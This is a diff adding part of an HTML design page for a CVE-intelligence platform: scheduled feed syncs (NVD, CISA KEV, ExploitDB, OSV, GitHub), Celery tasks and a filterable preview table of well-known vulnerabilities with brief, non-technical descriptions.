+    <div class="exploit-summary">A flaw in the Linux kernel's pipe buffer management (introduced in v5.8) allows a local user to overwrite data in arbitrary read-only files, including SUID binaries. The bug stems from a missing flag initialization when merging pipe pages, enabling splice() calls to mark read-only page cache entries as writable. A local attacker can overwrite /etc/passwd or replace SUID executables to escalate to root without any special privileges beyond a local user account.</div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     SECTION 5: SCHEDULER
+════════════════════════════════════════════ -->
+<div id="tab-scheduler" class="section">
+  <div class="section-header">
+    <div class="section-num">05 / 06</div>
+    <div>
+      <div class="section-title">Automated Update Scheduler</div>
+      <div class="section-sub">pg_cron inside PostgreSQL + Celery task queue for heavy jobs. Zero external orchestration needed for the core loop.</div>
+    </div>
+  </div>
+
+  <div class="cron-grid" style="margin-bottom:2rem">
+    <div class="cron-card hourly">
+      <div class="cron-schedule">0 * * * *</div>
+      <div class="cron-name">KEV + NVD Modified Delta</div>
+      <div class="cron-desc">Fetch CISA KEV JSON (full, ~1MB). Pull NVD delta with <code>lastModStartDate</code> = last successful run. Detect newly KEV-listed CVEs, push webhooks.</div>
+      <div class="cron-sources">
+        <span class="tag tag-blue" style="font-size:9px">NVD delta</span>
+        <span class="tag" style="border-color:#7f1d1d;color:#ef4444;background:rgba(239,68,68,.08);font-size:9px">CISA KEV</span>
+      </div>
+    </div>
+    <div class="cron-card daily">
+      <div class="cron-schedule">30 2 * * *</div>
+      <div class="cron-name">Full OSV + ExploitDB Sync</div>
+      <div class="cron-desc">Download ExploitDB CSV mirror from GitHub. Sync OSV.dev ecosystem feeds. Enrich new CVEs with exploit classification and AI summaries.</div>
+      <div class="cron-sources">
+        <span class="tag tag-purple" style="font-size:9px">OSV.dev</span>
+        <span class="tag" style="border-color:#92400e;color:#fbbf24;background:rgba(234,179,8,.08);font-size:9px">ExploitDB</span>
+      </div>
+    </div>
+    <div class="cron-card daily">
+      <div class="cron-schedule">0 4 * * *</div>
+      <div class="cron-name">GitHub PoC Scanner</div>
+      <div class="cron-desc">Search GitHub for repos referencing any CVE published in last 30 days. Update star counts on tracked repos. Alert on new PoC for CRITICAL/KEV CVEs.</div>
+      <div class="cron-sources">
+        <span class="tag" style="border-color:#166534;color:#4ade80;background:rgba(34,197,94,.08);font-size:9px">GitHub API</span>
+      </div>
+    </div>
+    <div class="cron-card weekly">
+      <div class="cron-schedule">0 6 * * 0</div>
+      <div class="cron-name">Full Integrity Check</div>
+      <div class="cron-desc">Full MITRE CVE list diff. Detect rejected CVEs, update state. Refresh materialized views. Vacuum analyze all tables. Generate weekly freshness report.</div>
+      <div class="cron-sources">
+        <span class="tag tag-cyan" style="font-size:9px">MITRE full</span>
+        <span class="tag" style="border-color:#1f2937;color:#6b7280;background:transparent;font-size:9px">DB maintenance</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">SQL</span><span>Setup pg_cron jobs — runs entirely inside PostgreSQL</span></div>
+    <div class="code-body"><span class="cm">-- Install: CREATE EXTENSION pg_cron;</span>
+<span class="cm">-- pg_cron runs jobs as postgres superuser within the DB</span>
+
+<span class="cm">-- ① Hourly: NVD delta + KEV refresh</span>
+<span class="kw">SELECT</span> <span class="fn">cron.schedule</span>(
+    <span class="st">'nvd-delta-hourly'</span>,
+    <span class="st">'0 * * * *'</span>,
+    <span class="st">$$SELECT net.http_post(</span>
+        <span class="st">'http://ingestion-service:8000/sync/nvd-delta',</span>
+        <span class="st">'{}',</span>
+        <span class="st">'application/json'</span>
+    <span class="st">)$$</span>
+);
+
+<span class="cm">-- ② Daily: Full ExploitDB + OSV sync at 02:30 UTC</span>
+<span class="kw">SELECT</span> <span class="fn">cron.schedule</span>(
+    <span class="st">'exploitdb-daily'</span>,
+    <span class="st">'30 2 * * *'</span>,
+    <span class="st">$$SELECT net.http_post('http://ingestion-service:8000/sync/exploitdb','{}','application/json')$$</span>
+);
+
+<span class="cm">-- ③ Refresh materialized view daily at 06:00</span>
+<span class="kw">SELECT</span> <span class="fn">cron.schedule</span>(
+    <span class="st">'refresh-mv-stats'</span>,
+    <span class="st">'0 6 * * *'</span>,
+    <span class="st">$$REFRESH MATERIALIZED VIEW CONCURRENTLY mv_severity_stats$$</span>
+);</div>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">PYTHON</span><span>Celery tasks with delta-sync logic</span></div>
+    <div class="code-body"><span class="kw">from</span> <span class="va">celery</span> <span class="kw">import</span> <span class="ty">Celery</span>
+<span class="kw">from</span> <span class="va">datetime</span> <span class="kw">import</span> <span class="ty">datetime</span>, <span class="ty">timezone</span>
+<span class="kw">import</span> <span class="va">httpx</span>
+
+app = <span class="ty">Celery</span>(<span class="st">'cve_intel'</span>, broker=<span class="st">'redis://redis:6379/0'</span>)
+
+<span class="op">@</span>app.task(bind=<span class="kw">True</span>, max_retries=<span class="nu">3</span>)
+<span class="kw">def</span> <span class="fn">sync_nvd_delta</span>(<span class="va">self</span>):
+    <span class="cm">"""Pull only CVEs modified since last successful run."""</span>
+    last_run = <span class="fn">get_last_successful_sync</span>(<span class="st">"nvd"</span>)   <span class="cm"># query sync_log</span>
+    url = (
+        <span class="st">f"https://services.nvd.nist.gov/rest/json/cves/2.0"</span>
+        <span class="st">f"?lastModStartDate={last_run.isoformat()}"</span>
+        <span class="st">f"&lastModEndDate={datetime.now(timezone.utc).isoformat()}"</span>
+    )
+    <span class="kw">with</span> <span class="fn">httpx.Client</span>() <span class="kw">as</span> client:
+        results = <span class="fn">paginate_nvd</span>(client, url)   <span class="cm"># handles startIndex pagination</span>
+    <span class="kw">for</span> vuln <span class="kw">in</span> results:
+        normalized = <span class="fn">normalize_nvd_record</span>(vuln)
+        <span class="fn">upsert_cve</span>(normalized)               <span class="cm"># INSERT ... ON CONFLICT DO UPDATE</span>
+    <span class="fn">log_sync_success</span>(<span class="st">"nvd"</span>, <span class="fn">len</span>(results))
+
+<span class="op">@</span>app.task
+<span class="kw">def</span> <span class="fn">sync_cisa_kev</span>():
+    <span class="cm">"""Full KEV refresh — small file, just re-download and diff."""</span>
+    r = <span class="fn">httpx.get</span>(<span class="st">"https://www.cisa.gov/.../known_exploited_vulnerabilities.json"</span>)
+    kev_ids = {v[<span class="st">"cveID"</span>] <span class="kw">for</span> v <span class="kw">in</span> r.<span class="fn">json</span>()[<span class="st">"vulnerabilities"</span>]}
+    <span class="cm"># Upsert kev_entries, update cves.kev_status in bulk</span>
+    <span class="fn">bulk_update_kev_status</span>(kev_ids)
+    <span class="cm"># Find newly added KEV CVEs → trigger webhooks</span>
+    new_kevs = <span class="fn">get_newly_added_kevs</span>(kev_ids)
+    <span class="kw">if</span> new_kevs: <span class="fn">dispatch_kev_alerts</span>.delay(new_kevs)</div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     SECTION 6: LIVE PREVIEW
+════════════════════════════════════════════ -->
+<div id="tab-preview" class="section">
+  <div class="section-header">
+    <div class="section-num">06 / 06</div>
+    <div>
+      <div class="section-title">Live Data Preview</div>
+      <div class="section-sub">Example database output — what the stored + enriched records look like when served via the API</div>
+    </div>
+  </div>
+
+  <div class="stats-bar">
+    <div class="stat-cell"><div class="stat-num red">247,319</div><div class="stat-label">Total CVEs</div></div>
+    <div class="stat-cell"><div class="stat-num orange">1,247</div><div class="stat-label">KEV Listed</div></div>
+    <div class="stat-cell"><div class="stat-num red">8,432</div><div class="stat-label">Critical</div></div>
+    <div class="stat-cell"><div class="stat-num orange">71,204</div><div class="stat-label">High</div></div>
+    <div class="stat-cell"><div class="stat-num blue">14,891</div><div class="stat-label">With Exploits</div></div>
+    <div class="stat-cell"><div class="stat-num green">189,440</div><div class="stat-label">Patched</div></div>
+  </div>
+
+  <div class="preview-controls">
+    <input class="search-box" id="cve-search" type="text" placeholder="Search CVE ID, description, vendor..."/>
+    <button class="filter-btn crit active" onclick="filterSev('CRITICAL')">CRITICAL</button>
+    <button class="filter-btn active" onclick="filterSev('HIGH')">HIGH</button>
+    <button class="filter-btn active" onclick="filterSev('MEDIUM')">MEDIUM</button>
+    <button class="filter-btn" onclick="toggleKev(this)">KEV ONLY</button>
+    <button class="filter-btn" onclick="toggleExploit(this)">HAS EXPLOIT</button>
+    <div style="margin-left:auto;display:flex;align-items:center;gap:.5rem;font-size:10px;color:var(--muted)">
+      <div class="live-dot"></div> LIVE DATA
+    </div>
+  </div>
+
+  <div class="cve-table-wrap">
+    <table class="cve-table" id="cve-table">
+      <thead>
+        <tr>
+          <th>CVE ID</th><th>Severity</th><th>Score</th>
+          <th>Description</th><th>Vendor / Product</th>
+          <th>CWE</th><th>KEV</th><th>Exploit</th><th>Published</th>
+        </tr>
+      </thead>
+      <tbody id="cve-tbody"></tbody>
+    </table>
+  </div>
+
+  <!-- CVE Detail Modal -->
+  <div class="modal-overlay" id="modal" onclick="closeModal(event)">
+    <div class="modal" id="modal-content">
+      <div class="modal-header">
+        <div>
+          <div style="font-size:10px;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;margin-bottom:.3rem">CVE Detail</div>
+          <div id="modal-cve-id" style="font-family:var(--sans);font-size:1.4rem;font-weight:800;color:var(--text)"></div>
+        </div>
+        <button class="modal-close" onclick="document.getElementById('modal').classList.remove('open')">✕ Close</button>
+      </div>
+      <div class="modal-body" id="modal-body"></div>
+    </div>
+  </div>
+</div>
+
+</div><!-- end wrap -->
+
+<footer style="border-top:1px solid var(--border);padding:1.5rem 2rem;font-size:10px;color:var(--muted);display:flex;justify-content:space-between;flex-wrap:wrap;gap:.5rem;margin-top:3rem">
+  <span>CVE·INTEL Platform · PostgreSQL + 6-Source Pipeline</span>
+  <span>Schema: 6 tables · 8 index types · pg_cron + Celery scheduler</span>
+</footer>
+
+<script>
+// ── Tab system ──
+function showTab(name) {
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
+  document.getElementById('tab-' + name).classList.add('active');
+  event.target.classList.add('active');
+}
+
+// ── Sample CVE data ──
+const CVE_DATA = [
+  { id:"CVE-2021-44228", sev:"CRITICAL", score:10.0, desc:"Apache Log4j2 JNDI injection leading to remote code execution via maliciously crafted log messages.", vendor:"Apache", product:"Log4j2", cwes:["CWE-20","CWE-400"], kev:true, exploit:true, exploitType:"RCE", difficulty:"low", published:"2021-12-10", sources:["NVD","MITRE","CISA","ExploitDB"] },
+  { id:"CVE-2022-0847",  sev:"HIGH",     score:7.8,  desc:"Linux kernel pipe buffer flaw (Dirty Pipe) allows local users to overwrite read-only files and escalate privileges.", vendor:"Linux", product:"Kernel", cwes:["CWE-281"], kev:true, exploit:true, exploitType:"LPE", difficulty:"medium", published:"2022-03-07", sources:["NVD","MITRE","CISA","ExploitDB"] },
+  { id:"CVE-2023-44487", sev:"HIGH",     score:7.5,  desc:"HTTP/2 Rapid Reset attack enables unauthenticated denial of service by sending streams and immediately resetting them.", vendor:"Multiple", product:"HTTP/2 Servers", cwes:["CWE-400"], kev:true, exploit:true, exploitType:"DoS", difficulty:"medium", published:"2023-10-10", sources:["NVD","MITRE","CISA"] },
+  { id:"CVE-2023-23397", sev:"CRITICAL", score:9.8,  desc:"Microsoft Outlook zero-click privilege escalation via specially crafted email triggering NTLM credential theft.", vendor:"Microsoft", product:"Outlook", cwes:["CWE-20"], kev:true, exploit:true, exploitType:"LPE", difficulty:"low", published:"2023-03-14", sources:["NVD","MITRE","CISA","ExploitDB"] },
+  { id:"CVE-2022-30190", sev:"HIGH",     score:7.8,  desc:"Microsoft Windows MSDT (Follina) remote code execution via Office documents using the MSDT URL protocol handler.", vendor:"Microsoft", product:"Windows MSDT", cwes:["CWE-610"], kev:true, exploit:true, exploitType:"RCE", difficulty:"low", published:"2022-06-01", sources:["NVD","MITRE","CISA","GitHub"] },
+  { id:"CVE-2021-26084", sev:"CRITICAL", score:9.8,  desc:"Atlassian Confluence OGNL injection via specially crafted web requests allows unauthenticated RCE.", vendor:"Atlassian", product:"Confluence", cwes:["CWE-74"], kev:true, exploit:true, exploitType:"RCE", difficulty:"low", published:"2021-08-25", sources:["NVD","MITRE","CISA","ExploitDB"] },
+  { id:"CVE-2023-27997", sev:"CRITICAL", score:9.8,  desc:"Fortinet FortiOS SSL-VPN heap buffer overflow in pre-authentication phase leading to remote code execution.", vendor:"Fortinet", product:"FortiOS SSL-VPN", cwes:["CWE-122"], kev:true, exploit:true, exploitType:"RCE", difficulty:"low", published:"2023-06-11", sources:["NVD","MITRE","CISA"] },
+  { id:"CVE-2022-47966", sev:"CRITICAL", score:9.8,  desc:"ManageEngine multiple products allow remote code execution due to use of an outdated Apache Santuario XML security library.", vendor:"Zoho", product:"ManageEngine", cwes:["CWE-1035"], kev:true, exploit:true, exploitType:"RCE", difficulty:"low", published:"2023-01-10", sources:["NVD","MITRE","CISA","ExploitDB"] },
+  { id:"CVE-2023-20198", sev:"CRITICAL", score:10.0, desc:"Cisco IOS XE web UI feature allows unauthenticated remote attackers to create an account with privilege level 15.", vendor:"Cisco", product:"IOS XE", cwes:["CWE-269"], kev:true, exploit:true, exploitType:"Auth_Bypass", difficulty:"low", published:"2023-10-16", sources:["NVD","MITRE","CISA"] },
+  { id:"CVE-2022-41082", sev:"HIGH",     score:8.8,  desc:"Microsoft Exchange Server ProxyNotShell remote code execution via authenticated SSRF leading to arbitrary code execution.", vendor:"Microsoft", product:"Exchange Server", cwes:["CWE-502"], kev:true, exploit:true, exploitType:"RCE", difficulty:"medium", published:"2022-10-03", sources:["NVD","MITRE","CISA","GitHub"] },
+  { id:"CVE-2023-34362", sev:"CRITICAL", score:9.8,  desc:"Progress MOVEit Transfer SQL injection vulnerability exploited by Cl0p ransomware group to steal sensitive data.", vendor:"Progress", product:"MOVEit Transfer", cwes:["CWE-89"], kev:true, exploit:true, exploitType:"SQLi", difficulty:"low", published:"2023-06-02", sources:["NVD","MITRE","CISA","ExploitDB"] },
+  { id:"CVE-2022-26134", sev:"CRITICAL", score:9.8,  desc:"Atlassian Confluence OGNL injection via specially crafted HTTP requests bypassing authentication in all versions.", vendor:"Atlassian", product:"Confluence", cwes:["CWE-74"], kev:true, exploit:true, exploitType:"RCE", difficulty:"low", published:"2022-06-02", sources:["NVD","MITRE","CISA","ExploitDB"] },
+  { id:"CVE-2023-22515", sev:"CRITICAL", score:10.0, desc:"Atlassian Confluence Data Center broken access control allows unauthenticated creation of administrator accounts.", vendor:"Atlassian", product:"Confluence DC", cwes:["CWE-284"], kev:true, exploit:true, exploitType:"Auth_Bypass", difficulty:"low", published:"2023-10-04", sources:["NVD","MITRE","CISA"] },
+  { id:"CVE-2022-1388",  sev:"CRITICAL", score:9.8,  desc:"F5 BIG-IP iControl REST API authentication bypass via crafted HTTP request, allowing unauthenticated RCE with admin privileges.", vendor:"F5", product:"BIG-IP", cwes:["CWE-306"], kev:true, exploit:true, exploitType:"Auth_Bypass", difficulty:"low", published:"2022-05-04", sources:["NVD","MITRE","CISA","ExploitDB"] },
+  { id:"CVE-2021-34527", sev:"CRITICAL", score:8.8,  desc:"Windows Print Spooler (PrintNightmare) allows authenticated users to load arbitrary DLLs and escalate to SYSTEM.", vendor:"Microsoft", product:"Windows Spooler", cwes:["CWE-269"], kev:true, exploit:true, exploitType:"LPE", difficulty:"medium", published:"2021-07-02", sources:["NVD","MITRE","CISA","ExploitDB","GitHub"] },
+  { id:"CVE-2021-40444", sev:"HIGH",     score:7.8,  desc:"Microsoft MSHTML remote code execution via specially crafted Office documents exploiting ActiveX control instantiation.", vendor:"Microsoft", product:"MSHTML", cwes:["CWE-77"], kev:true, exploit:true, exploitType:"RCE", difficulty:"medium", published:"2021-09-15", sources:["NVD","MITRE","CISA","ExploitDB"] },
+  { id:"CVE-2023-46604", sev:"CRITICAL", score:10.0, desc:"Apache ActiveMQ ClassInfo deserialization vulnerability in OpenWire protocol allows unauthenticated RCE.", vendor:"Apache", product:"ActiveMQ", cwes:["CWE-502"], kev:true, exploit:true, exploitType:"RCE", difficulty:"low", published:"2023-10-27", sources:["NVD","MITRE","CISA","ExploitDB","GitHub"] },
+  { id:"CVE-2024-3400",  sev:"CRITICAL", score:10.0, desc:"Palo Alto Networks PAN-OS command injection in the GlobalProtect feature allows unauthenticated RCE with root privileges.", vendor:"Palo Alto", product:"PAN-OS GlobalProtect", cwes:["CWE-20"], kev:true, exploit:true, exploitType:"RCE", difficulty:"low", published:"2024-04-12", sources:["NVD","MITRE","CISA"] },
+  { id:"CVE-2024-21413", sev:"CRITICAL", score:9.8,  desc:"Microsoft Outlook improper input validation allows remote code execution via specially crafted hyperlinks in email messages.", vendor:"Microsoft", product:"Outlook", cwes:["CWE-20"], kev:false, exploit:true, exploitType:"RCE", difficulty:"low", published:"2024-02-13", sources:["NVD","MITRE","ExploitDB"] },
+  { id:"CVE-2023-4911",  sev:"HIGH",     score:7.8,  desc:"glibc buffer overflow in the dynamic linker ld.so (Looney Tunables) allows local privilege escalation to root.", vendor:"GNU", product:"glibc (ld.so)", cwes:["CWE-122"], kev:true, exploit:true, exploitType:"LPE", difficulty:"medium", published:"2023-10-03", sources:["NVD","MITRE","CISA","OSV"] },
+];
+
+let visibleSevs = new Set(['CRITICAL','HIGH','MEDIUM']);
+let kevOnly = false;
+let exploitOnly = false;
+let searchTerm = '';
+
+function renderTable() {
+  const tbody = document.getElementById('cve-tbody');
+  let filtered = CVE_DATA.filter(r => {
+    if (!visibleSevs.has(r.sev)) return false;
+    if (kevOnly && !r.kev) return false;
+    if (exploitOnly && !r.exploit) return false;
+    if (searchTerm) {
+      const q = searchTerm.toLowerCase();
+      if (!r.id.toLowerCase().includes(q) && !r.desc.toLowerCase().includes(q) &&
+          !r.vendor.toLowerCase().includes(q) && !r.product.toLowerCase().includes(q)) return false;
+    }
+    return true;
+  });
+  tbody.innerHTML = filtered.map(r => `
+    <tr>
+      <td><span class="cve-id" onclick="openModal('${r.id}')">${r.id}</span></td>
+      <td><span class="sev sev-${r.sev}">${r.sev}</span></td>
+      <td style="font-weight:600;color:${r.score>=9?'#ef4444':r.score>=7?'#fb923c':r.score>=4?'#fbbf24':'#4ade80'}">${r.score.toFixed(1)}</td>
+      <td style="max-width:320px;color:var(--muted);font-size:11px;line-height:1.5">${r.desc.substring(0,120)}…</td>
+      <td style="white-space:nowrap"><div style="font-size:11px;color:var(--text)">${r.vendor}</div><div style="font-size:10px;color:var(--muted)">${r.product}</div></td>
+      <td>${r.cwes.map(c=>`<span class="cwe-pill">${c}</span>`).join('')}</td>
+      <td>${r.kev ? '<span class="kev-yes">YES</span>' : '<span class="kev-no">—</span>'}</td>
+      <td>${r.exploit ? `<span class="exploit-yes">✓ ${r.exploitType}</span>` : '<span class="exploit-no">—</span>'}</td>
+      <td style="font-size:11px;color:var(--muted);white-space:nowrap">${r.published}</td>
+    </tr>
+  `).join('');
+}
+
+function filterSev(sev) {
+  const btns = document.querySelectorAll('.filter-btn.crit, .filter-btn');
+  if (visibleSevs.has(sev)) visibleSevs.delete(sev);
+  else visibleSevs.add(sev);
+  // Update button states
+  document.querySelectorAll('.filter-btn').forEach(b => {
+    const label = b.textContent.trim();
+    if (['CRITICAL','HIGH','MEDIUM'].includes(label)) {
+      b.classList.toggle('active', visibleSevs.has(label));
+    }
+  });
+  renderTable();
+}
+
+function toggleKev(btn) {
+  kevOnly = !kevOnly;
+  btn.classList.toggle('active', kevOnly);
+  renderTable();
+}
+
+function toggleExploit(btn) {
+  exploitOnly = !exploitOnly;
+  btn.classList.toggle('active', exploitOnly);
+  renderTable();
+}
+
+document.getElementById('cve-search').addEventListener('input', e => {
+  searchTerm = e.target.value;
+  renderTable();
+});
+
+function openModal(cveId) {
+  const r = CVE_DATA.find(d => d.id === cveId);
+  if (!r) return;
+  document.getElementById('modal-cve-id').textContent = r.id;
+  document.getElementById('modal-body').innerHTML = `
+    <div class="detail-grid">
+      <div class="detail-cell"><div class="detail-label">Severity</div><div><span class="sev sev-${r.sev}">${r.sev}</span></div></div>
+      <div class="detail-cell"><div class="detail-label">CVSS Score</div><div class="detail-value" style="color:${r.score>=9?'#ef4444':r.score>=7?'#fb923c':'#fbbf24'}">${r.score.toFixed(1)}</div></div>
+      <div class="detail-cell"><div class="detail-label">KEV Status</div><div class="detail-value">${r.kev?'<span class="kev-yes">IN CATALOG</span>':'<span class="kev-no">NOT LISTED</span>'}</div></div>
+      <div class="detail-cell"><div class="detail-label">Exploit Type</div><div class="detail-value" style="color:#f97316">${r.exploitType||'—'}</div></div>
+      <div class="detail-cell"><div class="detail-label">Difficulty</div><div class="detail-value">${r.difficulty||'—'}</div></div>
+      <div class="detail-cell"><div class="detail-label">Published</div><div class="detail-value" style="font-size:13px">${r.published}</div></div>
+    </div>
+    <div style="margin-bottom:1.25rem">
+      <div class="detail-label" style="margin-bottom:.4rem">Description</div>
+      <div style="font-size:13px;color:var(--muted);line-height:1.8;border-left:2px solid var(--accent);padding-left:.75rem">${r.desc}</div>
+    </div>
+    <div style="margin-bottom:1.25rem">
+      <div class="detail-label" style="margin-bottom:.5rem">CWE Classifications</div>
+      ${r.cwes.map(c=>`<span class="cwe-pill">${c}</span>`).join(' ')}
+    </div>
+    <div style="margin-bottom:1.25rem">
+      <div class="detail-label" style="margin-bottom:.5rem">Data Sources</div>
+      <div style="display:flex;gap:.4rem;flex-wrap:wrap">${r.sources.map(s=>`<span class="tag tag-blue" style="font-size:9px">${s}</span>`).join('')}</div>
+    </div>
+    <div style="margin-bottom:1rem">
+      <div class="detail-label" style="margin-bottom:.5rem">Vendor / Product</div>
+      <div style="font-size:14px;color:var(--text)"><strong>${r.vendor}</strong> — ${r.product}</div>
+    </div>
+    ${r.exploit ? `
+    <div style="border-top:1px solid var(--border);padding-top:1rem;margin-top:.5rem">
+      <div class="detail-label" style="margin-bottom:.5rem">Exploit Intelligence</div>
+      <div class="exploit-card" style="margin-bottom:0">
+        <div class="exploit-title">
+          Public exploit(s) available
+          <span style="font-size:9px;padding:1px 7px;background:rgba(239,68,68,.12);border:1px solid #7f1d1d;color:#ef4444;border-radius:2px">${r.exploitType}</span>
+          <span style="font-size:9px;padding:1px 7px;background:rgba(251,146,60,.12);border:1px solid #9a3412;color:#fb923c;border-radius:2px">difficulty: ${r.difficulty}</span>
+          ${r.kev?'<span class="kev-yes">ACTIVE IN WILD</span>':''}
+        </div>
+        <div class="exploit-summary">
+          Exploit code is publicly available for this vulnerability. 
+          The exploitation difficulty is classified as <strong style="color:${r.difficulty==='low'?'#ef4444':r.difficulty==='medium'?'#fb923c':'#4ade80'}">${r.difficulty}</strong>.
+          ${r.kev ? ' CISA has confirmed active exploitation in the wild — immediate patching is required for federal agencies and strongly recommended for all organizations.' : ' No in-wild exploitation confirmed by CISA at this time, though PoC code exists.'}
+        </div>
+      </div>
+    </div>` : ''}
+  `;
+  document.getElementById('modal').classList.add('open');
+}
+
+function closeModal(e) {
+  if (e.target === document.getElementById('modal')) {
+    document.getElementById('modal').classList.remove('open');
+  }
+}
+
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') document.getElementById('modal').classList.remove('open');
+});
+
+// Initial render
+renderTable();
+</script>
+</body></html>
